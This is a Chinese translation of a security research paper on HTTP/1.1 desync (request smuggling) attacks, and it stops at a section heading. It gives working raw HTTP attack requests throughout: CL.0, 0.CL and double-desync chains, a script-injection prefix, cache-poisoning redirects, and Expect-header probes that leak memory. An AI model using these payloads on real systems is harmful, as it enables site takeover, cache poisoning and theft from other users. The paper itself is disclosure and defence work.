https://portswigger.net/research/http1-must-die

# HTTP/1.1 must die: the desync endgame（HTTP/1.1 必须消亡：反同步的终局之战）

> 作者：**James Kettle**（研究总监）  
> Twitter：[@albinowax](https://twitter.com/albinowax)

- **发布时间：** 2025 年 8 月 6 日（星期三）22:20 UTC
- **更新日期：** 2025 年 10 月 17 日（星期五）10:13 UTC

## 摘要

上游 HTTP/1.1 本身是不安全的，并定期使数百万网站面临被恶意接管的风险。六年来试图缓解的努力只是隐藏了问题，却未能修复它。

本文介绍了几种新型的 HTTP 反同步攻击，能够大规模泄露用户凭据。这些技术通过详细的案例研究进行演示，包括危及 Akamai、Cloudflare 和 Netlify 内部核心基础设施、导致数千万网站暴露的关键漏洞。

我还介绍了一个开源工具包，能够系统性地检测解析器差异和特定目标的弱点。结合使用这套工具包和这些技术，在两周内获得了超过 20 万美元的漏洞赏金。

最后，我认为 [HTTP 请求走私](/web-security/request-smuggling)必须被认识为一个根本性的协议缺陷。过去六年的经验表明，解决个别实现问题永远无法消除这一威胁。尽管我的发现已被报告和修补，网站仍然默默地暴露于未来不可避免的新变种攻击之下。所有这些都源于 HTTP/1.1 的一个致命缺陷，这意味着微小的实现错误经常引发严重的安全后果。HTTP/2+ 解决了这一威胁。如果我们想要一个安全的网络，HTTP/1.1 必须消亡。

请注意，您可以在 [http1mustdie.com](https://http1mustdie.com/) 找到面向更广泛受众的摘要和常见问题解答。您还可以获取[演讲幻灯片](https://portswigger.net/kb/papers/dzmxreq/http1-must-die-slides.pdf)和本白皮书的[可打印 PDF 版本](https://portswigger.net/kb/papers/dzmxreq/http1-must-die.pdf)。以下是 DEFCON 的演讲录像：

<iframe src="https://www.youtube.com/embed/PUCyExOr3sE?origin=https://portswigger.net&rel=0"></iframe>

## 目录

- [反同步的终局之战](#反同步的终局之战)
  - [HTTP/1.1 的致命缺陷](#http11-的致命缺陷)
  - [治标不治本的缓解措施](#治标不治本的缓解措施)
  - [意外入侵 2000 万个网站](#意外入侵-2000-万个网站)
  - ["HTTP/1 很简单"与其他谎言](#http1-很简单与其他谎言)
- [赢得反同步终局之战的策略](#赢得反同步终局之战的策略)
  - [检测解析器差异](#检测解析器差异)
  - [理解 V-H 和 H-V 差异](#理解-v-h-和-h-v-差异)
  - [将 V-H 差异转化为 CL.0 反同步](#将-v-h-差异转化为-cl0-反同步)
  - [利用 ALB 后 IIS 上的 H-V 差异](#利用-alb-后-iis-上的-h-v-差异)
  - [在不使用 Transfer-Encoding 的情况下利用 H-V 差异](#在不使用-transfer-encoding-的情况下利用-h-v-差异)
- [0.CL 反同步攻击](#0cl-反同步攻击)
  - [0.CL 死锁](#0cl-死锁)
  - [超越 400 Bad Request](#超越-400-bad-request)
  - [通过双重反同步将 0.CL 转化为 CL.0](#通过双重反同步将-0cl-转化为-cl0)
  - [更多反同步攻击即将到来](#更多反同步攻击即将到来)
- [基于 Expect 的反同步攻击](#基于-expect-的反同步攻击)
  - [绕过响应头移除](#绕过响应头移除)
  - [通过普通 Expect 实现 0.CL 反同步——T-Mobile](#通过普通-expect-实现-0cl-反同步t-mobile)
  - [通过混淆 Expect 实现 0.CL 反同步——Gitlab](#通过混淆-expect-实现-0cl-反同步gitlab)
  - [通过普通 Expect 实现 CL.0 反同步——Netlify CDN](#通过普通-expect-实现-cl0-反同步netlify-cdn)
  - [通过混淆 Expect 实现 CL.0 反同步——Akamai CDN](#通过混淆-expect-实现-cl0-反同步akamai-cdn)
- [防御 HTTP 反同步攻击](#防御-http-反同步攻击)
  - [为什么修补 HTTP/1.1 还不够](#为什么修补-http11-还不够)
  - [HTTP/2 相比 HTTP/1 有多安全？](#http2-相比-http1-有多安全)
  - [如何与 HTTP/1 共存的生存策略](#如何与-http1-共存的生存策略)
  - [如何帮助杀死 HTTP/1.1](#如何帮助杀死-http11)
- [结论](#结论)

## 反同步的终局之战

### HTTP/1.1 的致命缺陷

HTTP/1.1 有一个致命的、极易被利用的缺陷——各个 HTTP 请求之间的边界非常脆弱。请求只是简单地拼接在底层的 TCP/TLS 套接字上，没有任何分隔符，并且有多种方式可以指定它们的长度。这意味着攻击者可以对一个请求的结束位置和下一个请求的开始位置制造极大的歧义。大型网站通常使用反向代理，将来自不同用户的请求通过共享连接池汇集到后端服务器。这意味着，只要攻击者在服务器链中发现最微小的解析器差异，就可以造成反同步，将恶意前缀应用到其他用户的请求上，通常可以实现完全的站点接管：

![反同步概念图](/cms/images/79/c4/0434-article-desync-concept.png)

由于 HTTP/1.1 是一个古老的、宽容的、基于文本的协议，拥有成千上万的实现，找到解析器差异并不困难。当我在 2019 年首次发现这一威胁时，感觉几乎可以攻破任何东西。例如，我展示了如何利用它来[入侵 PayPal 的登录页面](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#paypal)，而且成功了两次。此后，我们还发布了[关于请求走私的免费在线课程](https://portswigger.net/web-security/request-smuggling)和多个[进一步的研究论文](https://portswigger.net/research/request-smuggling)。如果您在后续的技术细节中感到困惑，回头参考这些资料可能会有所帮助。

六年过去了，人们很容易认为我们已经解决了这个问题，通过结合解析器加固和 HTTP/2（一种二进制协议，如果用于从前端开始的上游连接，几乎可以完全消除整个攻击类别）。不幸的是，事实证明我们所做的只是让问题看起来像是被解决了。

### 治标不治本的缓解措施

在 2025 年，HTTP/1.1 无处不在——但不一定显而易见。服务器和 CDN 通常声称支持 HTTP/2，但实际上会将传入的 HTTP/2 请求降级为 HTTP/1.1 以传输到后端系统，从而失去了大部分安全优势。将传入的 HTTP/2 消息降级甚至比端到端使用 HTTP/1.1 更危险，因为它引入了第四种指定消息长度的方法。在本文中，我们将使用以下缩写来表示四种主要的长度解释方式：

```
CL (Content-Length)
TE (Transfer-Encoding)
0 (Implicit-zero)
H2 (HTTP/2's built-in length)
```

HTTP/1.1 乍一看可能很安全，因为如果您应用原始的请求走私方法和工具包，很难造成反同步。但这是为什么呢？让我们看一下一个使用轻微混淆的 Transfer-Encoding 头的经典 CL.TE 攻击。在这次攻击中，我们希望前端服务器使用 Content-Length 头解析请求，然后将请求转发给使用 Transfer-Encoding 头计算长度的后端。

```http
POST / HTTP/1.1
Host: <redacted>
Transfer-Encoding : chunked
Content-length: 35

0

GET /robots.txt HTTP/1.1
X: y
```

```http
HTTP/1.1 200 OK
```

以下是模拟受害者：

```http
GET / HTTP/1.1
Host: example.com
```

```http
HTTP/1.1 200 OK

Disallow: /
```

这在过去对大量网站都有效。如今，即使您的目标**确实存在漏洞**，探测也可能会失败，原因有以下三个：

- WAF 现在使用正则表达式来检测并阻止带有混淆 Transfer-Encoding 头的请求，或消息体中可能存在的 HTTP 请求。
- `/robots.txt` 检测小工具在您的特定目标上不起作用。
- 存在服务器端竞争条件，使得该技术在特定目标上极不可靠。

我在之前研究中讨论的基于超时的替代检测策略也被 WAF 大量指纹识别和阻止。

这就造成了反同步的终局——由于玩具级别的缓解措施和选择性加固，您产生了安全的错觉，这些措施只会破坏已建立的检测方法。一切看起来都很安全，直到您做出最微小的改变。

事实上，HTTP/1.1 的实现中充斥着严重漏洞，您甚至可以意外发现它们。

### 意外入侵 2000 万个网站

HTTP/1.1 根本不适应我们通过增加层来解决所有问题的世界。以下案例研究完美地说明了这一点。

[Wannes Verwimp](https://www.linkedin.com/in/wannes-verwimp/) 向我询问他在 Cloudflare 后面的 Heroku 托管网站上发现的一个问题。他发现了一个 H2.0 反同步，并能够利用它将访问者重定向到他自己的网站。

```http
GET /assets/icon.png HTTP/2
Host: <redacted>

GET /assets HTTP/1.1
Host: psres.net
X: y
```

```http
HTTP/2 200 OK
Cf-Cache-Status: HIT
```

```http
GET / HTTP/2
Host: <redacted>

```

```http
HTTP/2 302 Found
Location: https://psres.net/assets/
```

这个重定向被保存在 Cloudflare 的缓存中，因此通过投毒 JavaScript 文件的缓存条目，他能够持久地控制整个网站。这一切都并不特别，除了一件事——被劫持的用户并不是在尝试访问目标网站。该攻击实际上危害了随机的第三方网站，包括某些银行！

我同意进行调查，并注意到另一件奇怪的事情——该攻击被 Cloudflare 的前端缓存阻止了，这意味着请求永远不会到达后端服务器。我推断这个攻击不可能成功，Wannes 一定犯了错误，于是我添加了一个缓存破坏器……攻击失败了。当我移除缓存破坏器时，它又开始工作了。

通过忽略他的攻击被缓存阻止的事实，Wannes 发现了 Cloudflare 基础设施内部的一个 HTTP/1.1 反同步：

![Cloudflare 内部反同步](/cms/images/6c/34/a872-article-cloudflare.png)

这一发现使超过 2400 万个网站面临完全被接管的风险！它体现了反同步的终局——经典方法论不起作用，但构建在 HTTP/1 上的系统如此复杂和关键，以至于你只需犯一个错误，就能获得对 2400 万个网站的控制权。

我们报告了这个问题，Cloudflare 在数小时内修补了它，[发布了事后分析报告](https://blog.cloudflare.com/resolving-a-request-smuggling-vulnerability-in-pingora/)，并授予了 7,000 美元的赏金。

不熟悉漏洞赏金猎杀的读者可能会对本文中相对于影响支付的赏金感到惊讶，但大多数收到的赏金都接近相应计划公布的最高支付额。赏金大小是潜在经济学的产物，任何真正令人惊讶的赏金经历都会被特别指出。

### "HTTP/1 很简单"与其他谎言

这样的漏洞是如何发生的？部分原因是所涉及系统的绝对复杂性。例如，我们可以推断，通过 HTTP/2 发送到 Cloudflare 的请求有时会在内部被重写为 HTTP/1.1，然后在上游连接中再次被重写为 HTTP/2！然而，根本问题在于基础。

有一个广泛存在且危险的误解，认为 HTTP/1.1 是一个健壮的基础，适合您可能构建的任何系统。特别是，没有实现过反向代理的人经常争论 HTTP/1.1 很简单，因此很安全。当您尝试代理 HTTP/1.1 时，它变得远不那么简单。为了说明这一点，以下是我个人曾经相信的五个谎言——每个谎言都将在本文后面讨论的现实世界漏洞利用中起到关键作用：

- 谎言 1：HTTP/1.1 请求不能直接针对中间节点。
- 谎言 2：HTTP/1.1 反同步只能由解析器差异引起。
- 谎言 3：HTTP/1.1 响应包含代理解析它所需的一切。
- 谎言 4：HTTP/1.1 响应只能包含一个头部块。
- 谎言 5：完整的 HTTP/1.1 响应需要完整的请求。

您相信了哪些？您能将每个陈述与破坏它的特性对应起来吗？

综合来看，最后三个谎言背后的现实是，您的代理需要引用请求对象，才能从后端 TCP 套接字读取正确数量的响应字节，并且即使在到达响应体之前，您也需要控制流分支来处理多个头部块，而且整个响应可能在客户端尚未完成向您发送请求之前就已到达。

这就是 HTTP/1.1——它是 Web 的基础，充满了复杂性和陷阱，定期使数百万网站暴露，而我们花了六年时间试图修补实现来弥补它。它必须消亡。为了实现这一点，我们需要共同向世界展示 HTTP/1.1 是不安全的——特别是，更多的反同步攻击总会到来。

在本文的其余部分，我希望向您展示如何做到这一点。

所有案例研究都是通过在有漏洞披露计划（VDP）的目标上进行授权测试发现的，并已私下报告和修补（除非另有说明）。作为 VDP 条款和条件的副作用，其中许多被部分删节，即使问题实际上已被修补。当明确命名某家公司时，这表明他们拥有更成熟的安全计划。

本研究期间获得的所有赏金在所有参与者之间平均分配，我的份额由 PortSwigger 加倍后捐赠给了[当地一家慈善机构](https://www.42ndstreet.org.uk/)。

## 赢得反同步终局之战的策略

### 检测解析器差异

在反同步的终局中，由于缓解措施、复杂性和特性差异，检测漏洞变得困难。为了在这种环境中蓬勃发展，我们需要一种检测策略，能够可靠地识别使反同步攻击成为可能的潜在缺陷，而不是尝试涉及许多活动部件的脆弱攻击。这将使我们能够识别并克服利用挑战。

早在 2021 年，Daniel Thacher 在 Black Hat Europe 上介绍了[实用 HTTP 头走私](https://www.youtube.com/watch?v=RAtpG6OYYNM)，并描述了一种使用 Content-Length 头检测解析器差异的方法。我非常喜欢这个概念，以至于在尝试了他的工具后，我决定从头开始构建自己的实现，稍微不同地处理事情，看看会发生什么。

这个工具非常有效，我很高兴以开源 Burp Suite 扩展 [HTTP Request Smuggler v3.0](https://github.com/PortSwigger/http-request-smuggler/) 的形式发布它。以下是用于分析的三个关键元素及其可能结果的高级概述：

![HTTP Request Smuggler 3.0 工作原理](/cms/images/61/19/f4a9-article-reqsmuggler.png)

### 理解 V-H 和 H-V 差异

让我们看看实际的检测以及如何解释它：

```http
GET / HTTP.1.1
Host: <redacted-food-corp>
Xost: <redacted-food-corp>
 Host: <redacted-food-corp>
 Xost: <redacted-food-corp>
```

```http
HTTP/1.1 200 OK
HTTP/1.1 503 Service Unavailable
HTTP/1.1 400 Bad Request
HTTP/1.1 503 Service Unavailable
```

在这里，HTTP Request Smuggler 检测到发送带有部分隐藏 Host 头的请求会产生一个独特的响应，该响应无法通过发送正常的 Host 头、完全省略该头或发送任意掩码头来触发。这是目标所用服务器链中存在解析器差异的有力证据。如果我们假设存在前端和后端，则有两种关键可能性：

- **可见-隐藏（V-H）**：掩码的 Host 头对前端可见，但对后端隐藏。
- **隐藏-可见（H-V）**：掩码的 Host 头对前端隐藏，但对后端可见。

您通常可以通过密切关注响应，并猜测它们是来自前端还是后端来区分 V-H 和 H-V 差异。请注意，特定的状态码并不重要，有时甚至可能令人困惑。重要的是它们不同。这个发现结果是 V-H 差异。

### 将 V-H 差异转化为 CL.0 反同步

给定一个 V-H 差异，您可以尝试通过向后端隐藏 Transfer-Encoding 头来利用 TE.CL，或者通过隐藏 Content-Length 头来利用 CL.0。我强烈建议尽可能使用 CL.0，因为它不太可能被 WAF 阻止。在许多 V-H 目标上，包括上面的那个，利用很简单：

```http
GET /style.css HTTP/1.1
Host: <redacted-food-corp>
Foo: bar
 Content-Length: 23

GET /404 HTTP/1.1
X: y
```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
Host: <redacted-food-corp>
```

```http
HTTP/1.1 404 Not Found
```

在另一个目标上，上述利用失败，因为前端服务器拒绝接受包含消息体的 GET 请求。我只需将方法切换为 OPTIONS 就能绕过这个问题。正是这种发现和绕过障碍的能力，使得扫描解析器差异如此有用。

我没有在这个目标上花时间制作完全武器化的 PoC，因为对于低薪的赏金计划和 VDP 来说，这不划算。

### 检测策略

通过结合不同的头部、排列和策略，该工具实现了卓越的覆盖率。例如，以下是使用相同的头部（Host）、相同的排列（头部名称前的空格），但不同的策略（带有无效值的重复 Host）发现的：

```http
POST /js/jquery.min.js
Host: <vpn.redacted>
Host: x/x
Xost: x/x
 Host: x/x
 Xost: x/x
```

```http
HTTP/1.1 400 Bad Request
HTTP/1.1 412 Precondition Failed
HTTP/1.1 200 OK
HTTP/1.1 412 Precondition Failed
```

这个目标再次使用 CL.0 反同步直接利用了。根据我的经验，Web VPN 通常有缺陷的 HTTP 实现，我强烈建议不要将它们放在任何反向代理后面。

### 检测高风险解析

差异检测方法还可以识别偏离公认解析约定的服务器，因此如果放置在反向代理后面，很可能存在漏洞。例如，扫描一个 `<redacted>` 服务器发现它们不将 `\n\n` 视为头部块的终止符：

```http
POST / HTTP/1.1\r\n
Content-Length: 22\r\n
A: B\r\n
\n
Expect: 100-continue\r\n

```

```http
HTTP/1.1 100 Continue

HTTP/1.1 302 Found
Server: <redacted>
```

这对于直接访问是无害的，但 [RFC-9112](https://datatracker.ietf.org/doc/html/rfc9112#section-2.2) 规定“接收方可以识别单个 LF 作为行终止符”。在这样的前端后面，这是可利用的。这个漏洞被追溯到底层的 HTTP 库，补丁正在路上。报告像这样的理论发现不太可能为您带来可观的漏洞赏金，但可能对使生态系统更安全有很大帮助。

### 利用 ALB 后 IIS 上的 H-V 差异

HTTP Request Smuggler 还识别了大量在 AWS Application Load Balancer（ALB）后面使用 Microsoft IIS 的易受攻击系统。理解这一点很有用，因为 AWS 不打算修补它。检测通常如下所示：

```
Host: foo/bar
Xost: foo/bar
Host : foo/bar
Xost : foo/bar
```

```
400, Server; awselb/2.0
200, -no server header-
400, Server: Microsoft-HTTPAPI/2.0
200, -no server header-
```

正如您可以从服务器横幅中推断出的，这是一个 H-V 差异：当格式错误的 Host 头被混淆时，ALB 看不到它，并将请求传递给后端服务器。

利用 H-V 差异的经典方式是使用 CL.TE 反同步，因为 Transfer-Encoding 头通常优先于 Content-Length，但这被 AWS 的[反同步防护模式](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html#desync-mitigation-mode)阻止了。我决定搁置这个问题以专注于其他发现，然后 Thomas Stacey [独立发现了它](https://assured.se/posts/the-single-packet-shovel-desync-powered-request-tunnelling)，并使用 H2.TE 反同步绕过了反同步防护。

即使 H2.TE 绕过被修复，攻击者仍然可以利用这一点来走私头部，实现 IP 欺骗和[有时完全的身份验证绕过](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#explore)。

我向 AWS 报告了这个问题，结果发现他们已经知道但选择不修补，因为他们不想破坏与发送格式错误请求的古老 HTTP/1 客户端的兼容性。您可以通过更改两个设置来自己修补：

- 设置 `routing.http.drop_invalid_header_fields.enabled`
- 设置 `routing.http.desync_mitigation_mode = strictest`

这个未修复的发现暴露了云代理的一个被忽视的危险：采用它们会将另一家公司的技术债务直接导入您自己的安全态势。

### 在不使用 Transfer-Encoding 的情况下利用 H-V 差异

这项研究的下一个重大突破是当我在某个网站上发现了一个 H-V 差异，该网站阻止所有包含 Transfer-Encoding 的请求，使得 CL.TE 攻击不可能。唯一的出路是：0.CL 反同步攻击。

## 0.CL 反同步攻击

### 0.CL 死锁

0.CL 反同步攻击被广泛认为是不可利用的。要理解为什么，请考虑当您向具有 H-V 解析器差异的目标发送以下攻击时会发生什么：

```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
```

前端看不到 Content-Length 头，因此它将橙色载荷视为第二个请求的开始。这意味着它缓冲橙色载荷，只将头部块转发到后端：

```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7
```

```http
HTTP/1.1 504 Gateway Timeout
```

后端确实看到了 Content-Length 头，因此它将等待消息体到达。同时，前端将等待后端回复。最终，其中一个服务器将超时并重置连接，破坏攻击。本质上，0.CL 反同步攻击通常会导致上游连接死锁。

### 打破 0.CL 死锁

在这项研究之前，我花了两年时间探索[竞争条件](/web-security/race-conditions)和定时攻击。在这个过程中，我偶然发现了 0.CL 死锁的解决方案。

每当我尝试在运行 nginx 的目标上对静态文件使用[单包攻击](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local)时，nginx 都会在请求完成之前响应请求，从而破坏我的定时测量。这在当时需要一个复杂的变通方法，但暗示了一种使 0.CL 可利用的方式。

摆脱 0.CL 死锁的关键是找到一个早期响应小工具：一种使后端服务器在不等待消息体到达的情况下响应请求的方法。这在 nginx 上很简单，但我的目标运行的是 IIS，静态文件技巧在那里不起作用。那么，我们如何说服 IIS 在不等待消息体到达的情况下响应请求呢？让我们看看[我最喜欢的 Windows 文档](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)：

> 不要将以下保留名称用作文件名：
>
> CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7...

如果您尝试使用保留名称访问文件或文件夹，操作系统将出于有趣的遗留原因抛出异常。我们可以通过简单地请求映射到文件系统的任何文件夹中的 'con' 来使服务器触发这个特性。

我发现如果我访问目标网站上的 /con，IIS 会在不等待消息体到达的情况下响应，并保持连接打开。当与 CL.0 反同步结合时，这将导致它将第二个请求的开始解释为第一个请求的消息体，触发 400 Bad Request 响应。这是从用户视角看到的情况：

```http
GET /con HTTP/1.1
Host: <redacted>
Content-Length:
 7
```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
Host: <redacted>

```

```http
HTTP/1.1 400 Bad Request
```

以及后端连接上的视图：

```http
GET /con HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET / HTTTP/1.1
Host: <redacted>
```

我知道 /con 这个特性已经超过十年了，但这是我第一次真正能够利用它！此外，在过去的六年里，我看到了太多可疑的“Bad request”响应，我甚至让 HTTP Request Smuggler 用神秘的标题 [Mystery 400](https://github.com/PortSwigger/http-request-smuggler/blob/a05163d42989c07ff24bcd9e81e6e2d3c70ec966/src/burp/ImplicitZeroScan.java#L137) 来报告它们。这一刻我意识到它们可能都是可利用的。

在其他服务器上，我发现服务器级重定向可以作为早期响应小工具。然而，我从未在 Apache 上找到可行的工具；它们在遇到错误条件时太热衷于关闭连接。

### 超越 400 Bad Request

为了证明您找到了 0.CL 反同步，下一步是触发一个可控的响应。在攻击请求之后，发送一个包含嵌套在头部块内的第二个路径的“受害者”请求：

```http
GET /con HTTP/1.1
Host: <redacted>
Content-Length:
 20
```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
X: yGET /wrtz HTTP/1.1
Host: <redacted>
```

```http
HTTP/1.1 302 Found
Location: /Logon?ReturnUrl=%2fwrtz
```

如果您正确设置了第一个请求的 Content-Length，它将从受害者请求中切掉初始字节，您将看到一个响应，指示隐藏的请求行已被处理。

这足以证明存在 0.CL 反同步，但这显然不是一个现实的攻击——我们不能假设受害者会在自己的请求中包含载荷！我们需要一种将载荷添加到受害者请求中的方法。我们需要将 0.CL 转化为 CL.0。

### 通过双重反同步将 0.CL 转化为 CL.0

要将 0.CL 转化为 CL.0，我们需要一个双重反同步！这是一个多阶段攻击，攻击者使用两个请求的顺序来为受害者设置陷阱：

- 第一个请求用 0.CL 反同步投毒连接。
- 被投毒的连接将第二个请求武器化为 CL.0 反同步，然后用恶意前缀重新投毒连接。
- 恶意前缀然后投毒受害者的请求，导致有害响应。

实现这一点的最干净方式是让 0.CL 切掉第一个请求的整个头部块：

```http
POST /nul HTTP/1.1
Content-length:
 163

POST / HTTP/1.1
Content-Length: 111

GET / HTTP/1.1
Host: <redacted>

GET /wrtz HTTP/1.1
Foo: bar
```

不幸的是，这并不像看起来那么容易。您需要知道第二个请求头部块的确切大小，而几乎所有前端服务器都会添加额外的头部。在后端，上述请求序列最终看起来像：

```http
POST /nul HTTP/1.1
Content-length:
 163

GET / HTTP/1.1
Content-Length: 111
??????: ???????????

--connection terminated--
```

您可以使用新的 [0cl-find-offset](https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples/0cl-find-offset.py) Turbo Intruder 脚本来发现注入头部的长度，但这些通常包含客户端 IP 等内容，这意味着攻击对您有效，但当其他人尝试复现时会失败。这使得漏洞赏金分类变得痛苦。

经过大量痛苦之后，我发现了一个更好的方法。大多数服务器在头部块的末尾插入头部，而不是在开头。因此，如果我们的走私请求在此之前开始，攻击将可靠地工作！以下是一个使用输入反射来揭示插入头部的示例：

```http
POST /nul HTTP/1.1
Content-length:
 92
```

```http
HTTP/1.1 200 OK
```

```http
GET /z HTTP/1.1
Content-Length: 180
Foo: GET /y HTTP/1.1
???: ???? // 前端头部落在这里

POST /index.asp HTTP/1.1
Content-Length: 201

<redacted>=zwrt
```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
Host: <redacted>
```

```
Invalid input
  zwrtGET / HTTP/1.1
  Host:<redacted>
  Connection:keep-alive
  Accept-Encoding:identity
```

从此，我们可以使用传统的 CL.0 利用技术。在这个目标上，我使用了 HEAD 技术向随机用户提供恶意 JavaScript：

```http
POST /nul HTTP/1.1
Host: <redacted>
Content-length:
 44
```

```http
HTTP/1.1 200 OK
```

```http
GET /aa HTTP/1.1
Content-Length: 150
Foo: GET /bb HTTP/1.1
Host: <redacted>

HEAD /index.asp HTTP/1.1
Host: <redacted>

GET /?<script>alert(1 HTTP/1.1
X: Y
```

```http
HTTP/1.1 200 OK
Location: /Logon?returnUrl=/bb
```

```http
GET / HTTP/1.1
Host: <redacted>

```

```http
HTTP/1.1 200 OK
Content-Length: 56670
Content-Type: text/html

HTTP/1.1 302 Found
Location: /Logon?returnUrl=/<script>…
```

您可以使用我们新的 Web Security Academy 实验 [0.CL Request Smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling) 免费练习这项技术。

使用这些技术，我们最初在有漏洞赏金计划的网站上发现了大约十个简单的 0.CL 漏洞。其中许多发现是在使用某个云 WAF 的网站上——这不是我们第一次看到 WAF 使网站更容易被入侵。在这一点上，我们被其他发现分散了注意力，没有费心将任何攻击武器化到 DoS 之外，所以这仅使总赏金达到 21,645 美元。最好的赏金体验来自 [EXNESS](https://hackerone.com/exness?type=team)，他们奖励了 7,500 美元。像往常一样，最有价值的成果不是赏金本身——而是这项工作为我们后续发现提供的基础。

### 更多反同步攻击即将到来

在这一点上，我认为反同步威胁终于被完全映射了，未来的问题将是个别的、一次性的实现缺陷。这是我每年都会犯的错误。以下是请求走私重大进展的部分历史：

- 2004 年：[HTTP Request Smuggling](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf)——（基本上被遗忘了）
- 2016 年：[Hiding wookies in HTTP](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf)——（当时基本被忽视）
- 2019 年：[利用头部解析器差异](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)（CL.TE, TE.CL）
- 2021 年：[利用 HTTP/2 降级](https://portswigger.net/research/http2)（H2.CL, H2.TE）
- 2022 年：[利用忽略 CL 的端点](https://portswigger.net/research/browser-powered-desync-attacks)（CL.0, H2.0, CSD）
- 2024 年：[利用去块](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)（TE.0）
- 2025 年：[利用块扩展](https://w4ke.info/2025/06/18/funky-chunks.html)（TE.TE）
- 刚刚：0.CL 反同步攻击

直到下一个发现，我才终于意识到真相——更多的反同步攻击总会到来。

## 基于 Expect 的反同步攻击

### Expect 复杂性炸弹

早在 2022 年，我尝试过使用 [Expect 头进行反同步攻击](https://github.com/PortSwigger/http-request-smuggler/blame/a07da1292dcaaaefbebbc79b764e576962fedf3c/src/burp/DesyncBox.java#L422)，但没有发现什么。事实证明，我挖得还不够深。

这一次，我最初开始使用 Expect 头是在寻找一种无需早期响应小工具即可检测 0.CL 反同步漏洞的方法。

Expect 头是一种古老的优化方式，它将发送单个 HTTP 请求分为两步过程。客户端发送包含 `Expect: 100-continue` 的头部块，服务器评估请求是否会被接受。如果服务器响应 `HTTP/1.1 100 Continue`，则客户端被允许发送请求体。

这对客户端和服务器来说都很复杂，对反向代理来说则更糟。考虑如果前端不支持 Expect、看不到头部、或将值解析为 100-continue 会发生什么？后端呢？如果后端提前响应，或者客户端不等待 100-continue 呢？

Expect 头很特别的第一个明确线索是，它破坏了 Turbo Intruder 工具中的 HTTP 客户端，在一个任何错误都可能导致反同步的关键点上。修复客户端极大地增加了代码复杂性。以下是之前的读取线上响应的代码：

![之前的代码](/cms/images/f1/3d/9cf6-article-code-before.png)

以及之后：

![之后的代码](/cms/images/71/91/ac0e-article-code-after.png)

Expect 也破坏了服务器。在一个网站上，Expect 使服务器忘记了 HEAD 响应没有消息体，并试图从后端套接字读取太多数据，导致上游死锁：

```http
HEAD /<redacted> HTTP/1.1
Host: api.<redacted>
Content-Length: 6
Expect: 100-continue

ABCDEF
```

```http
HTTP/1.1 100 Continue

HTTP/1.1 504 Gateway Timeout
```

这很有趣但相对无害——只构成 DoS 风险。其他不当行为则不那么无害，例如多个服务器通过 Expect 响应泄露内存。这产生了神秘的文本片段：

```http
POST / HTTP/1.1
Host: <redacted>
Expect: 100-continue
Content-Length: 1

X
```

```http
HTTP/1.1 404 Not Found
HTTP/1.1 100 Continue

d

Ask the hotel which eHTTP/1.1 404 Not Found
HTTP/1.1 100 Continue

d
```

以及密钥：

```http
POST / HTTP/1.1
Host: <redacted>
Expect: 100-continue
Content-Length: 1

X
```

```http
HTTP/1.1 401 Unauthorized
Www-Authenticate: Bearer
HTTP/1.1 100 ContinTransfer-EncodingzxWthTQmiI8fJ4oj9fzE"
X-: chunked

HTTP/1.1 401 Unauthorized
Www-Authenticate: Bearer
HTTP/1.1 100 ContinTransfer-EncodingzxWthTQm145
```

### 绕过响应头移除

所有 HTTP/1.1 响应都有一个头部块——除非您发送 Expect。因此，第二个头部块常常让解析器措手不及，并破坏前端服务器移除敏感响应头的尝试。以下是一个示例：

```http
POST /_next/static/foo.js HTTP/1.1
Host: app.netlify.com

```

```http
HTTP/1.1 200 OK
Server: Netlify
X-Nf-Request-Id: <redacted>
```

```http
POST /_next/static/foo.js HTTP/1.1
Host: app.netlify.com
Expect: 100-continue

```

```http
HTTP/1.1 100 Continue
Server: Netlify
X-Nf-Request-Id: <redacted>

HTTP/1.1 200 OK
X-Bb-Account-Id: <redacted>
X-Bb-Cache-Gen: <redacted>
X-Bb-Deploy-Id: <redacted>
X-Bb-Site-Domain-Id: <redacted>
X-Bb-Site-Id: <redacted>
X-Cnm-Signal-K: <redacted>
X-Nf-Cache-Key: <redacted>
X-Nf-Ats-Version: <redacted>
X-Nf-Cache-Info: <redacted>
X-Nf-Cache-Result: <redacted>
X-Nf-Proxy-Header-Rewrite:<redacted>
X-Nf-Proxy-Version: <redacted>
X-Nf-Srv-Version: <redacted>
```

我向 Netlify 报告了这个示例，他们说“这些信息是设计提供的”。

这项技术还揭示了数百个人们试图掩盖的服务器/版本横幅，以减轻针对性利用。幸运的是，暴露的服务器横幅对合规性的威胁比对任何关键系统都大。

### 一次计划外的合作

大约在这个时候，我收到了一支小型全职赏金猎人团队的消息——Paolo 'sw33tLie' Arnolfo、Guillermo 'bsysop' Gregorio 和 Mariani 'Medusa' Francesco。他们也注意到 Expect 头引发了一些有趣的事情。他们有扎实的研究背景——他们对 [TE.0 请求走私](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)的探索在 [2024 年十大 Web 黑客技术](https://portswigger.net/research/top-10-web-hacking-techniques-of-2024)中排名第三。因此，我们决定合作。

我们最终利用了许多、许多目标。我们的发现分为四大类：

### 通过普通 Expect 实现 0.CL 反同步——T-Mobile

